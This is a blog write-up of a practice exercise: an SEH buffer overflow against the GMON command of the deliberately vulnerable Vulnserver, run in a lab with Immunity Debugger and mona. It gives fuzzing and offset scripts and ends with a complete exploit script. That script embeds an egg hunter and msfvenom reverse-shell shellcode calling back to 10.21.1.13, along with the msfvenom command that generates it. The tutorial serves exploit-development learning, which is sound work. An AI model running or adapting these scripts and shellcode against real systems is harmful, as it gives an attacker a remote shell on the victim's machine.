---
title: "Vulnserver SEH Overflow"
date: "2020-04-11"
author: frosty
categories:
  - "blog"
tags:
  - "buffer-overflows"
  - "exploitation"
  - "osce"
---

As I'm gaining interest in exploit development, I decided to try and learn structured exception handler (SEH) buffer overflow exploits. For this demonstration, I'll be exploiting Vulnserver's GMON command on a 32-bit Windows 7 machine with Immunity Debugger.

A buffer overflow (BOF) is an exploit occurs when the user is able to control the execution flow of a program. In an SEH type of BOF, the user should be able to manipulate the exception handler location pointer to lead the program back to their payload.

* * *

## Fuzzing the application

We cannot start without knowing how many bytes we need to create an exception in the program. To do this we use a simple python script which sends a buffer of bytes, increasing the length of bytes being sent if the application responds to our request. When Vulnserver stops responding, we know that our buffer has caused an exception. We can also confirm this by attaching Vulnserver to Immunity Debugger.

```py
#!/usr/bin/python
import sys, socket
from time import sleep

ip = "10.21.1.15"
port = 9999

buffer = "A" * 100

while True:
    try:
        command = "GMON"
        print "[+] Sending buffer of %s bytes to %s" % (str(len(buffer)), command)

        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((ip, port))
        s.recv(1024)
        s.send(('GMON /.:/' + buffer))
        s.close()

        sleep(1)
        buffer = buffer + "A" * 100
    except:
        print "\n[-] Fuzzing crashed at %s bytes" % str(len(buffer))
        sys.exit()
```

The application stopped responding after sending 4100 bytes, and I cancelled the script after seeing the exception in Immunity Debugger. To confirm whether we have access to manipulate the SEH pointer, we can use the `Alt + S` hotkey which shows the SEH chain. The SEH chain includes the address of the current SEH, and the pointer to the next SEH (nSEH) - in the screenshot below both SEH and nSEH are overwritten by our buffer of 'A's.

![Image](assets/img/blog/vulnserver-seh-overflow/image-55.png)

![Image](assets/img/blog/vulnserver-seh-overflow/image-59.png)

We now need to identify the offset of the SEH and the nSEH. The Metasploit-Framework of course includes a binary which we use to create a pattern string that we send to the target.

![Image](assets/img/blog/vulnserver-seh-overflow/image-58.png)

```
$ /usr/bin/msf-pattern_create -l 4100
Aa0Aa1[...]Fg5Fg

$ /usr/bin/msf-pattern_offset -q 326E4531
[*] Exact match at offset 3515

$ /usr/bin/msf-pattern_offset -q 45336E45
[*] Exact match at offset 3519
```

We should confirm these offsets by sending the following buffer to Vulnserver

```py
#!/usr/bin/python
import sys, socket

ip = '10.21.1.15'
port = 9999

fuzz = "A" * 3515
nseh = "B" * 4
seh = "C" * 4
remainder = "C" * (4100-3515-4-4)

buffer = fuzz + nseh + seh + remainder

try:
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip,port))
    s.send(('GMON /.:/' + buffer))
    print "[+] Sending buffer"
    s.close()
except:
    print "[-] Failed!"
    sys.exit()
```

![Image](assets/img/blog/vulnserver-seh-overflow/image-75.png)

* * *

## Finding Bad Characters

To find bad characters we must send all bytes from `\x00` to `\xff`. The purpose is to identify bytes which either prevent the following bytes from being displayed, or are not handled properly themselves. When I send the bytes, I always omit the `\x00` (null byte) as it is almost certainly a bad character. In this case, there are no additional bad characters to the null byte as all bytes from `\x01` to `\xff` are displayed; which can be seen in the screenshot below.

![Image](assets/img/blog/vulnserver-seh-overflow/image-62-1024x498.png)

* * *

## Finding the POP POP RET

The "POP POP RET" instructions are commonly known in SEH exploits, and are the deciding factor to the success of this buffer overflow. It's purpose is to return the execution flow to the stack. The registers which are POPPED is not a concern, but rather we must find a POP POP RET instruction within within a module that has been compiled without SafeSEH. Vulnserver's `essfunc.dll` of course has a POP POP RET that we can use. However, the effect that POP POP RET has is that it will move the stack pointer to a higher address by 8 (4 bytes for each POP).

Luckily, [mona](https://github.com/corelan/mona) has a command that automatically finds POP POP RET instructions for us. To find the address, type `!mona seh` and select one from the list which has protections disabled. In this case, we can use the `0x625010B4` address.

![Image](assets/img/blog/vulnserver-seh-overflow/image-76.png)

We insert the POP POP RET into the SEH and test whether the exception handler does indeed point to essfunc.dll

```py
#!/usr/bin/python
import sys, socket

ip = '10.21.1.15'
port = 9999

# Badchars: \x00
# POP POP RET: \x625010B4 - essfunc.dll

fuzz = "A" * 3515
nseh = "B" * 4
seh = "\xB4\x10\x50\x62" # POP POP RET
remainder = "C" * (4100-3515-4-4)

buffer = fuzz + nseh + seh + remainder

try:
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip,port))
    s.send(('GMON /.:/' + buffer))
    print "[+] Sending buffer"
    s.close()
except:
    print "[-] Failed!"
    sys.exit()
```

![Image](assets/img/blog/vulnserver-seh-overflow/image-77.png)

Lets set a breakpoint on the `0x625010B4` address, and pass the exception (Shift + F9) then the programs hits the breakpoint. From there, we press F7 three times to follow where the POP POP RET leads to. Hint, it's the nSEH contents on the stack (BBBB).

![Image](assets/img/blog/vulnserver-seh-overflow/image-78.png)

When looking at the dump, we see that there is very little space for shell code. However, we can use the nSEH to jump backwards to some egg hunter code - which we talked about the other day.

![Image](assets/img/blog/vulnserver-seh-overflow/image-79.png)

https://frostylabs.net/projects/lets-go-egg-hunting/

* * *

## Finishing the Exploit

We use mona to generate some egg hunting code `!mona egg -t w00t` and insert that into the exploit in the initial buffer of As. I wondered if we could place the shellcode in the Cs however, I was not able to get that to work... We need to consider what nSEH will be set to. We want it to jump to the beginning of the egg hunter code. We calculate this with the 32 bytes of egg hunter, plus 2 bytes jump code, plus 5 bytes to A. I generate the shellcode using msfvenom, and we are ready to let the exploit go.

![Image](assets/img/blog/vulnserver-seh-overflow/image-74.png)

```py
#!/usr/bin/python
import sys, socket

ip = '10.21.1.15'
port = 9999

# Badchars: \x00

# Use !mona seh to find POP POP RET instructions
# POP POP RET: \x625010B4 - essfunc.dll

nseh = "\xEB\xD9\x90\x90" # Jump back to start of egg hunter
seh = "\xB4\x10\x50\x62" # POP POP RET

egghunter = (
    "\x66\x81\xca\xff\x0f\x42\x52\x6a"
    "\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
    "\xef\xb8\x77\x30\x30\x74\x8b\xfa"
    "\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
)

# msfvenom -p windows/shell_reverse_tcp EXITFUNC=thread LHOST=10.21.1.13 LPORT=1234 -b '\x00' -f python -v shellcode

shellcode =  b""
shellcode += b"\xda\xc6\xba\x81\x66\x7a\xf7\xd9\x74\x24\xf4"
shellcode += b"\x5f\x33\xc9\xb1\x52\x31\x57\x17\x03\x57\x17"
shellcode += b"\x83\x6e\x9a\x98\x02\x8c\x8b\xdf\xed\x6c\x4c"
shellcode += b"\x80\x64\x89\x7d\x80\x13\xda\x2e\x30\x57\x8e"
shellcode += b"\xc2\xbb\x35\x3a\x50\xc9\x91\x4d\xd1\x64\xc4"
shellcode += b"\x60\xe2\xd5\x34\xe3\x60\x24\x69\xc3\x59\xe7"
shellcode += b"\x7c\x02\x9d\x1a\x8c\x56\x76\x50\x23\x46\xf3"
shellcode += b"\x2c\xf8\xed\x4f\xa0\x78\x12\x07\xc3\xa9\x85"
shellcode += b"\x13\x9a\x69\x24\xf7\x96\x23\x3e\x14\x92\xfa"
shellcode += b"\xb5\xee\x68\xfd\x1f\x3f\x90\x52\x5e\x8f\x63"
shellcode += b"\xaa\xa7\x28\x9c\xd9\xd1\x4a\x21\xda\x26\x30"
shellcode += b"\xfd\x6f\xbc\x92\x76\xd7\x18\x22\x5a\x8e\xeb"
shellcode += b"\x28\x17\xc4\xb3\x2c\xa6\x09\xc8\x49\x23\xac"
shellcode += b"\x1e\xd8\x77\x8b\xba\x80\x2c\xb2\x9b\x6c\x82"
shellcode += b"\xcb\xfb\xce\x7b\x6e\x70\xe2\x68\x03\xdb\x6b"
shellcode += b"\x5c\x2e\xe3\x6b\xca\x39\x90\x59\x55\x92\x3e"
shellcode += b"\xd2\x1e\x3c\xb9\x15\x35\xf8\x55\xe8\xb6\xf9"
shellcode += b"\x7c\x2f\xe2\xa9\x16\x86\x8b\x21\xe6\x27\x5e"
shellcode += b"\xe5\xb6\x87\x31\x46\x66\x68\xe2\x2e\x6c\x67"
shellcode += b"\xdd\x4f\x8f\xad\x76\xe5\x6a\x26\x73\xef\x75"
shellcode += b"\xbb\xeb\x0d\x75\xc7\x39\x98\x93\xad\xad\xcd"
shellcode += b"\x0c\x5a\x57\x54\xc6\xfb\x98\x42\xa3\x3c\x12"
shellcode += b"\x61\x54\xf2\xd3\x0c\x46\x63\x14\x5b\x34\x22"
shellcode += b"\x2b\x71\x50\xa8\xbe\x1e\xa0\xa7\xa2\x88\xf7"
shellcode += b"\xe0\x15\xc1\x9d\x1c\x0f\x7b\x83\xdc\xc9\x44"
shellcode += b"\x07\x3b\x2a\x4a\x86\xce\x16\x68\x98\x16\x96"
shellcode += b"\x34\xcc\xc6\xc1\xe2\xba\xa0\xbb\x44\x14\x7b"
shellcode += b"\x17\x0f\xf0\xfa\x5b\x90\x86\x02\xb6\x66\x66"
shellcode += b"\xb2\x6f\x3f\x99\x7b\xf8\xb7\xe2\x61\x98\x38"
shellcode += b"\x39\x22\xb8\xda\xeb\x5f\x51\x43\x7e\xe2\x3c"
shellcode += b"\x74\x55\x21\x39\xf7\x5f\xda\xbe\xe7\x2a\xdf"
shellcode += b"\xfb\xaf\xc7\xad\x94\x45\xe7\x02\x94\x4f"

egg = "w00tw00t" + shellcode

fuzz = egg + "A" * (3515 - len(egg) - len(egghunter) - 5) + egghunter + "A" * 5
remain = "D" * (4100 - 3547 - len(nseh) - len(seh))

buffer = fuzz + nseh + seh + remain

try:
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip,port))
    s.send(('GMON /.:/' + buffer))
    print "[+] Sending buffer"
    s.close()
except:
    print "[-] Failed!"
    sys.exit()

```

![Image](assets/img/blog/vulnserver-seh-overflow/image-80.png)

* * *

## Links which helped me

- [Corelan SEH exploit tutorial](https://www.corelan.be/index.php/2009/07/25/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-3-seh/)
- [Capt. Meelo GMON tutorial](https://captmeelo.com/exploitdev/osceprep/2018/06/30/vulnserver-gmon.html)
- [Purpl3F0x](https://purpl3f0xsec.tech/2019/06/18/osce-prep-1.html)
